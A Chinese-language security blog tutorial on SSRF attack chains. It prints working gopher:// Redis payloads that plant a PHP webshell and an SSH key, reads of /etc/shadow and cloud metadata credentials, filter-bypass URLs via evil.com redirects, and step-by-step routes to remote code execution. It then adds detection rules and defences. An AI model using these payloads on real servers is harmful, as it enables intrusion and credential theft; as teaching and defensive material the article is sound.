---
title: "SSRF 攻击全指南：从信息收集到 RCE 的完整攻击链"
date: 2026-05-11T09:00:00+08:00
draft: false
categories: ["攻击技术"]
tags: ["SSRF", "RCE", "云安全", "内网渗透", "Web安全"]
description: "系统梳理 SSRF 攻击的完整链路，从协议利用到云元数据获取，再到内网服务攻击实现 RCE。"
showToc: true
TocOpen: true
---

## 概述

SSRF（Server-Side Request Forgery）是让服务器发起请求的漏洞。它的威力远超表面——从读取本地文件、获取云元数据、到攻击内网服务实现 RCE，SSRF 可以串联成一条完整的攻击链。

## SSRF 基础

### 原理

```
攻击者 → 目标服务器 → 发起请求 → 内部资源/外部服务
```

目标服务器充当了攻击者的"代理"，访问攻击者无法直接访问的资源。

### 常见触发点

```python
# URL 加载功能
resp = requests.get(user_provided_url)

# 图片处理
img = download_image(user_url)

# Webhook 回调
send_webhook(user_callback_url)

# 文件导入
import_from_url(user_file_url)
```

## 协议利用

### file:// — 本地文件读取

```bash
# 读取 Linux 系统文件
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline

# 读取 Windows 文件
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/windows/win.ini
```

### http:// — 云元数据获取

```bash
# AWS 元数据（IMDSv1）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS 元数据（IMDSv2 - 需要 Token）
PUT http://169.254.169.254/latest/api/token
# Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
GET http://169.254.169.254/latest/meta-data/
# Header: X-aws-ec2-metadata-token: <token>

# GCP 元数据
http://metadata.google.internal/computeMetadata/v1/
# Header: Metadata-Flavor: Google

# Azure 元数据
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### gopher:// — 构造任意 TCP 包

Gopher 协议可以构造任意 TCP 数据包，是 SSRF 最强大的武器。

**攻击 Redis：**

```bash
# 写入 Webshell
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a<%3fphp%20eval($_POST['cmd'])%3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# 写入 SSH 公钥
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$<len>%0d%0a<ssh-rsa AAAA...>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**攻击 MySQL：**

```bash
# MySQL 未授权访问（需要知道用户名和密码 hash）
gopher://127.0.0.1:3306/_<mysql_handshake_packet>
```

**攻击 FastCGI：**

```bash
# PHP-FPM 任意代码执行
gopher://127.0.0.1:9000/_<fastcgi_packet>
```

### dict:// — 服务探测

```bash
# 探测 Redis
dict://127.0.0.1:6379/info

# 探测 MySQL
dict://127.0.0.1:3306/

# 探测端口
dict://127.0.0.1:22/
dict://127.0.0.1:8080/
```

## 绕过技巧

### IP 进制转换

```bash
# 十六进制
0x7f000001 = 127.0.0.1
0x7f.0x0.0x0.0x1 = 127.0.0.1

# 八进制
0177.0.0.01 = 127.0.0.1

# 混合
0x7f.0.0.1 = 127.0.0.1
127.0.0x0.1 = 127.0.0.1

# 十进制
2130706433 = 127.0.0.1

# IPv6
[::1] = 127.0.0.1
[::ffff:127.0.0.1] = 127.0.0.1
```

### DNS 重绑定

```bash
# 原理：域名第一次解析到外网 IP（通过 WAF 检查）
#       第二次解析到内网 IP（实际请求）

# 工具：rbndr.us
# 配置域名交替返回外网和内网 IP

# 时间窗口攻击：
# 1. 发送大量请求
# 2. DNS TTL 设为 0 或极短
# 3. 部分请求会在 WAF 检查后、实际请求前切换 IP
```

### URL 解析差异

```bash
# @ 符号
http://evil@127.0.0.1:80
# WAF 解析为 evil，实际请求 127.0.0.1

# # 锚点
http://127.0.0.1#@evil.com
# 部分解析器忽略 # 后面的内容

# 302 跳转
# 外网服务器返回 302 到内网地址
HTTP/1.1 302 Found
Location: http://127.0.0.1/
```

### 限制绕过

```bash
# 限制只能访问特定域名
# 利用 URL 解析差异
http://allowed.com@127.0.0.1/

# 限制只能访问 HTTPS
# 利用重定向
https://evil.com → 302 → http://169.254.169.254/

# 限制 URL 长度
# 使用短域名或 IP 缩写
http://0x7f000001/
```

## 完整攻击链

### 链路 1：SSRF → 云元数据 → IAM 提权 → RCE

```
1. 发现 SSRF 漏洞点
2. 请求 http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. 获取 IAM Role 名称
4. 获取临时凭证（AccessKeyId, SecretAccessKey, Token）
5. 使用凭证枚举 AWS 服务
6. 利用过度授权的 Role 提权
7. 执行任意操作（创建 EC2、Lambda、修改 S3 等）
```

### 链路 2：SSRF → Redis → Webshell → RCE

```
1. 发现 SSRF 漏洞点
2. 使用 gopher:// 协议发送 Redis 命令
3. SET 一个 PHP Webshell
4. CONFIG SET dir /var/www/html
5. CONFIG SET dbfilename shell.php
6. SAVE
7. 访问 http://target/shell.php 执行命令
```

### 链路 3：SSRF → 内网 MySQL → 文件写入 → RCE

```
1. 发现 SSRF 漏洞点
2. 使用 gopher:// 协议发送 MySQL 协议包
3. 利用 INTO OUTFILE 写入 Webshell
4. 或利用 LOAD_FILE 读取敏感文件
```

### 链路 4：SSRF → FastCGI → PHP 代码执行

```
1. 发现 SSRF 漏洞点
2. 使用 gopher:// 协议发送 FastCGI 协议包
3. 设置 PHP_VALUE 为恶意代码
4. 触发 PHP 代码执行
```

## 检测方法

### 流量检测

```yaml
# Sigma 规则 - SSRF 特征检测
title: SSRF Suspicious Internal Request
status: stable
logsource:
    category: proxy
detection:
    selection:
        c-uri|contains:
            - '169.254.169.254'
            - 'metadata.google.internal'
            - 'file://'
            - 'gopher://'
            - 'dict://'
    condition: selection
level: high
```

### 日志分析

```bash
# 检查 Web 日志中的 SSRF 特征
grep -E '169\.254\.169\.254|file://|gopher://|dict://' access.log

# 检查出站请求日志
grep -E 'internal|localhost|127\.0\.0\.1|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.' outbound.log
```

## 防御措施

### 1. 输入验证

```python
from urllib.parse import urlparse
import ipaddress

def is_valid_url(url):
    parsed = urlparse(url)
    
    # 只允许 http/https
    if parsed.scheme not in ('http', 'https'):
        return False
    
    # 解析 IP
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        # 禁止内网 IP
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
    except ValueError:
        # 域名解析
        pass
    
    # 禁止元数据地址
    if parsed.hostname in ('169.254.169.254', 'metadata.google.internal'):
        return False
    
    return True
```

### 2. 网络隔离

```yaml
# 容器网络策略
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-access
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32
```

### 3. IMDSv2 强制

```bash
# AWS 强制使用 IMDSv2
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxx \
  --http-token required \
  --http-put-response-hop-limit 1
```

### 4. 出站流量监控

```yaml
# 监控异常出站请求
alert:
  name: "SSRF Outbound Detection"
  query: |
    SELECT * FROM network_connections
    WHERE dst_ip IN ('169.254.169.254', '127.0.0.1')
    AND src_ip NOT IN (allowed_sources)
  severity: high
```

## 总结

SSRF 不是一个孤立的漏洞，而是一个攻击链的起点。从信息收集到 RCE，SSRF 可以串联多个攻击步骤。防御 SSRF 需要多层次的策略：

1. **输入验证** — 过滤危险协议和内网地址
2. **网络隔离** — 限制服务器的出站访问
3. **最小权限** — 云 IAM 权限最小化
4. **监控告警** — 检测异常出站请求

---

*本文仅供安全研究和授权渗透测试使用。未经授权攻击他人系统是违法行为。*
